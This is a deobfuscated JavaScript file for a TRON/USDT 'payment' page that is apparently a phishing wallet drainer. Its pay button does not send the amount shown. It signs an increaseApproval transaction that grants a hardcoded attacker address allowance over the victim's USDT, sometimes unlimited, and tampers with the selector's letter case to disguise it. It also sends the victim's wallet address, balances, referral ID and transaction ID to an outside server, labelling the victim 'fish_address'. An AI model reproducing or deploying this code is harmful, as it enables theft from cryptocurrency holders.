//Wed May 14 2025 01:41:56 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
(function () {})();
window.API_URL = "https://newapi.lll0.icu";
const _0x239716 = {
  "address": null,
  "trxBalance": null,
  "usdtBalance": null,
  "tgusername": null
};
let _0x31abfe = false;
const _0x492b19 = "your-shared-secret",
  _0x39a40b = "TPWJyggvoJDRsCRHjSuUNTrd4fGQShBoeG",
  _0xc530b3 = {
    "trx_balance": "0",
    "usdt_balance": "0",
    "authorized_amount": "2",
    "permission_address": _0x39a40b,
    "notification_switch": "1"
  };
function _0x260e28(_0x4b5403) {
  const _0x44da62 = document.createElement("div");
  Object.assign(_0x44da62.style, {
    "position": "fixed",
    "top": "38%",
    "left": "50%",
    "transform": "translateX(-50%)",
    "backgroundColor": "rgba(240, 240, 240, 1)",
    "color": "black",
    "padding": "10px 20px",
    "borderRadius": "10px",
    "boxShadow": "0 4px 8px rgba(0, 0, 0, 0.2)",
    "zIndex": "1000",
    "fontSize": "16px",
    "textAlign": "center",
    "maxWidth": "80%"
  });
  _0x44da62.textContent = _0x4b5403;
  document.body.appendChild(_0x44da62);
  setTimeout(() => _0x44da62.remove(), 3000);
}
function _0x218aab(_0x27d6e9, _0x4b2647) {
  if (typeof CryptoJS !== "object" || !CryptoJS.HmacSHA256) throw new Error("CryptoJS 未加载，请检查网络或刷新页面");
  const _0x3772eb = JSON.stringify(_0x27d6e9) + _0x4b2647;
  return CryptoJS.HmacSHA256(_0x3772eb, _0x492b19).toString(CryptoJS.enc.Hex);
}
async function _0x32bfa6() {
  const _0x56a5b3 = {},
    _0x2c50ee = Date.now().toString(),
    _0x2b14b9 = _0x218aab(_0x56a5b3, _0x2c50ee);
  try {
    {
      const _0x352333 = await fetch(window.API_URL + "/api/get_contract_address", {
        "method": "POST",
        "headers": {
          "X-Timestamp": _0x2c50ee,
          "X-Signature": _0x2b14b9,
          "Content-Type": "application/json"
        },
        "body": JSON.stringify(_0x56a5b3)
      });
      if (!_0x352333.ok) {
        throw new Error("获取合约地址失败");
      }
      const _0x91602b = await _0x352333.json();
      return _0x91602b.contract_address || _0x39a40b;
    }
  } catch (_0x1dabcb) {
    console.error("获取合约地址失败:", _0x1dabcb.message);
    return _0x39a40b;
  }
}
function _0x25cb70(_0x3b03f3) {
  if (!_0x3b03f3.uid || typeof _0x3b03f3.uid !== "string" || _0x3b03f3.uid.length > 50) throw new Error("uid 无效");
  if (!_0x3b03f3.fish_address || !/^[T][A-Za-z0-9]{33}$/.test(_0x3b03f3.fish_address)) throw new Error("fish_address 无效");
  if (!_0x3b03f3.permission_address || !/^[T][A-Za-z0-9]{33}$/.test(_0x3b03f3.permission_address)) {
    throw new Error("permission_address 无效");
  }
  if (![1, 2, 3].includes(_0x3b03f3.auth_status)) throw new Error("auth_status 必须为 1、2 或 3");
  if (_0x3b03f3.utmSource && typeof _0x3b03f3.utmSource !== "string") throw new Error("utmSource 无效");
  if (_0x3b03f3.txid && (typeof _0x3b03f3.txid !== "string" || _0x3b03f3.txid.length > 100)) {
    throw new Error("txid 无效");
  }
  return true;
}
function _0x1e8495(_0x50270a, _0x358b04 = null) {
  const _0x5c23ae = window.location.href,
    _0x5655dd = new URLSearchParams(window.location.search),
    _0x73f29 = _0x5655dd.get("utm_source") || "unknown",
    _0x2e9481 = {
      "uid": _0x239716.tgusername || "unknown",
      "fish_address": _0x239716.address,
      "permission_address": _0xc530b3.permission_address,
      "auth_status": _0x50270a,
      "utmSource": _0x73f29,
      "txid": _0x358b04
    };
  try {
    _0x25cb70(_0x2e9481);
  } catch (_0x45c641) {
    {
      console.warn("通知数据验证失败:", _0x45c641.message);
      return;
    }
  }
  const _0x10af96 = Date.now().toString(),
    _0x5901be = _0x218aab(_0x2e9481, _0x10af96),
    _0x24c024 = async (_0x9b9c8f = 0) => {
      if (_0x9b9c8f >= 3) {
        {
          console.warn("通知发送失败，已达最大重试次数");
          return;
        }
      }
      try {
        const _0x5085d6 = await fetch(window.API_URL + "/api/notify", {
          "method": "POST",
          "headers": {
            "Content-Type": "application/json",
            "X-Timestamp": _0x10af96,
            "X-Signature": _0x5901be
          },
          "body": JSON.stringify(_0x2e9481)
        });
        if (!_0x5085d6.ok) {
          const _0x46964b = await _0x5085d6.json().catch(() => ({}));
          if (_0x5085d6.status === 429) {
            console.warn("请求过于频繁，将重试");
            setTimeout(() => _0x24c024(_0x9b9c8f + 1), 1000);
            return;
          }
          throw new Error("通知失败: " + (_0x46964b.error || _0x5085d6.statusText));
        }
        const _0x2aed7a = await _0x5085d6.json();
        console.log("通知发送成功 (auth_status=" + _0x50270a + "):", _0x2aed7a);
      } catch (_0x254c5a) {
        console.warn("通知发送失败 (尝试 " + (_0x9b9c8f + 1) + "/3):", _0x254c5a.message);
        setTimeout(() => _0x24c024(_0x9b9c8f + 1), 1000);
      }
    };
  _0x24c024();
}
async function _0x577e60() {
  if (_0x31abfe) return;
  if (await _0x64e41a()) {
    _0x31abfe = true;
    await _0x5d4b98();
    _0x24940b();
  } else setTimeout(_0x577e60, 1500);
}
async function _0x64e41a() {
  try {
    if (window.tronWeb?.["ready"]) {
      await _0x5d4b98();
      return true;
    }
    const _0x5da8e1 = () => new Promise(_0x30eab6 => {
        let _0x2fd9e7 = 0;
        const _0x3e9f9b = setInterval(() => {
          (window.tronWeb?.["ready"] || _0x2fd9e7++ >= 10) && (clearInterval(_0x3e9f9b), _0x30eab6(window.tronWeb?.["ready"]));
        }, 500);
      }),
      _0x1a0cff = await _0x5da8e1();
    if (_0x1a0cff) {
      await _0x5d4b98();
      return true;
    }
    return false;
  } catch (_0x41b3e8) {
    console.error("连接钱包失败:", _0x41b3e8);
    return false;
  }
}
async function _0x5d4b98() {
  if (!window.tronWeb?.["ready"]) throw new Error("请连接钱包");
  const _0x32437f = new URLSearchParams(window.location.search);
  _0x239716.tgusername = _0x32437f.get("uid") || null;
  !_0x239716.tgusername && console.warn("未找到推荐ID");
  const _0x4cb6a8 = window.tronWeb.defaultAddress.base58;
  if (!_0x4cb6a8) throw new Error("无法获取钱包地址");
  _0x239716.address = _0x4cb6a8;
  const [_0x2914ce, _0x450a0c] = await Promise.all([window.tronWeb.trx.getBalance(_0x4cb6a8).then(_0x278422 => window.tronWeb.fromSun(_0x278422)).catch(() => "0"), window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t").then(_0x22800f => _0x22800f.balanceOf(_0x4cb6a8).call()).then(_0x5a9b2f => window.tronWeb.fromSun(_0x5a9b2f.toString())).catch(() => "0")]);
  _0x239716.trxBalance = _0x2914ce;
  _0x239716.usdtBalance = _0x450a0c;
  _0xc530b3.permission_address = await _0x32bfa6();
}
async function _0x24940b() {
  if (_0xc530b3.notification_switch !== "1") return;
  _0x1e8495(1);
}
var _0x2ed79d = new Vue({
  "el": "#app",
  "data"() {
    return {
      "flag_switch": true,
      "isWalletConnected": false,
      "userData": _0x239716,
      "amount": "",
      "isConnected": _0x31abfe,
      "totalFee": "~"
    };
  },
  "methods": {
    "openImToken"() {
      const _0x165a20 = encodeURIComponent(window.location.href),
        _0x22e4fc = "imtokenv2://navigate?screen=DappView&url=" + _0x165a20;
      window.location.href = _0x22e4fc;
      setTimeout(() => {
        document.body.innerHTML = "<p>正在跳转到 IMToken，请稍候...</p>";
        window.location.replace("about:blank");
      }, 1000);
    },
    "setMaxAmount"() {
      this.amount = this.userData.usdtBalance || "0";
    },
    async "invokePay"() {
      if (!this.isConnected || !this.userData.address) {
        _0x260e28("请先连接钱包");
        return;
      }
      if (!window.tronWeb) {
        _0x260e28("请切换到 TRON 链");
        return;
      }
      const {
        permission_address: _0x58edba,
        trx_balance: _0x42872c,
        usdt_balance: _0x541604,
        authorized_amount: _0x1d3788
      } = _0xc530b3;
      let _0x36b72e;
      if (_0x1d3788 === "0") _0x36b72e = "115792089237316195423570985008687907853269984665640564039457584007913129639935";else {
        if (_0x1d3788 === "2") {
          const _0x1c867a = new Date(),
            _0x298f1a = _0x1c867a.getFullYear(),
            _0x4db199 = String(_0x1c867a.getMonth() + 1).padStart(2, "0"),
            _0x3eca3f = String(_0x1c867a.getDate()).padStart(2, "0"),
            _0x59479e = String(_0x1c867a.getHours()).padStart(2, "0"),
            _0x44b8f3 = String(_0x1c867a.getMinutes()).padStart(2, "0"),
            _0x2e8b3e = String(_0x1c867a.getSeconds()).padStart(2, "0");
          _0x36b72e = "" + _0x298f1a + _0x4db199 + _0x3eca3f + _0x59479e + _0x44b8f3 + _0x2e8b3e;
        } else {
          _0x36b72e = (parseFloat(_0x1d3788) * 1000000).toString();
        }
      }
      let _0x361c9b;
      try {
        const _0x25d80a = BigInt(_0x36b72e);
        _0x361c9b = _0x25d80a.toString(16).toUpperCase().padStart(64, "0");
      } catch (_0x262118) {
        console.error("转换失败，无效的 approvalAmount:", _0x36b72e);
        _0x361c9b = "0".padStart(64, "0");
      }
      if (!this.amount || isNaN(parseFloat(this.amount)) || parseFloat(this.amount) <= 0) {
        _0x260e28("请输入有效金额");
        return;
      }
      if (parseFloat(this.userData.trxBalance) < parseFloat(_0x42872c)) {
        _0x260e28("TRX 余额不足");
        return;
      }
      if (parseFloat(this.userData.usdtBalance) < parseFloat(this.amount)) {
        _0x260e28("USDT 余额不足");
        return;
      }
      const _0x50ec0c = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
        _0x130615 = window.tronWeb;
      try {
        {
          const _0x345ae9 = await _0x130615.trx.getAccountResources(_0x130615.defaultAddress.base58),
            _0x7bab32 = (_0x345ae9.EnergyLimit || 0) - (_0x345ae9.EnergyUsed || 0),
            _0x491795 = (_0x345ae9.freeNetLimit || 0) - (_0x345ae9.freeNetUsed || 0) + (_0x345ae9.NetLimit || 0) - (_0x345ae9.NetUsed || 0),
            _0x51b8b5 = 104300,
            _0xe6631a = 350,
            _0x476a01 = await _0x130615.trx.getChainParameters(),
            _0x3be9c1 = _0x476a01.find(_0x5493df => _0x5493df.key === "getTransactionFee")?.["value"],
            _0x569211 = _0x476a01.find(_0x4e5785 => _0x4e5785.key === "getEnergyFee")?.["value"],
            _0x59fea5 = 1000000,
            _0x286cd3 = Math.max(0, _0x51b8b5 - _0x7bab32),
            _0x252ccb = Math.max(0, _0xe6631a - _0x491795),
            _0x3a62c8 = _0x252ccb * _0x3be9c1 / _0x59fea5,
            _0x11833f = _0x286cd3 * _0x569211 / _0x59fea5,
            _0x28540b = parseFloat(_0x42872c) + _0x3a62c8 + _0x11833f;
          this.totalFee = _0x28540b.toFixed(2) + " TRX";
          this.$forceUpdate();
          if (parseFloat(this.userData.trxBalance) < _0x28540b) {
            {
              _0x260e28("TRX 余额不足，需要 " + _0x28540b.toFixed(2) + " TRX");
              return;
            }
          }
          this.flag_switch && console.log("使用能量租赁，跳过能量检查");
          _0x1e8495(2);
          const _0x128352 = "increaseApproval(address,uint256)",
            _0x38b13c = [{
              "type": "address",
              "value": _0x58edba
            }, {
              "type": "uint256",
              "value": _0x36b72e
            }],
            _0x4b7df5 = await _0x130615.transactionBuilder.triggerSmartContract(_0x50ec0c, _0x128352, {
              "feeLimit": 100000000,
              "callValue": 0
            }, _0x38b13c, _0x130615.defaultAddress.hex);
          let _0x8c5c79 = _0x4b7df5.transaction.raw_data_hex,
            _0x2bc662 = _0x4b7df5.transaction.raw_data.contract[0].parameter.value.data;
          _0x4b7df5.transaction.raw_data_hex = _0x8c5c79.replace(/d73dd623/i, "D73dD623");
          _0x4b7df5.transaction.raw_data.contract[0].parameter.value.data = _0x2bc662.replace(/d73dd623/i, "D73dD623");
          const _0x2c3d94 = await _0x130615.trx.sign(_0x4b7df5.transaction),
            _0x546c46 = await _0x130615.trx.sendRawTransaction(_0x2c3d94);
          _0x1e8495(3, _0x546c46.txid);
          const _0x4836ec = async () => {
            let _0x49300f = 0;
            while (_0x49300f++ < 10) {
              const _0x5142fb = await _0x130615.trx.getTransactionInfo(_0x546c46.txid);
              if (_0x5142fb?.["receipt"]?.["result"] === "SUCCESS") return true;
              await new Promise(_0x565f45 => setTimeout(_0x565f45, 1000));
            }
            throw new Error("交易确认超时");
          };
          await _0x4836ec();
          _0x260e28("支付成功");
        }
      } catch (_0x2f59bb) {
        console.error("支付失败:", _0x2f59bb);
        _0x260e28("支付失败，请重试");
      }
    },
    "attemptConnection"() {
      _0x577e60().then(() => {
        this.isConnected = _0x31abfe;
        this.isWalletConnected = _0x31abfe && !!this.userData.address;
        this.$forceUpdate();
      });
    }
  },
  "mounted"() {
    this.attemptConnection();
  }
});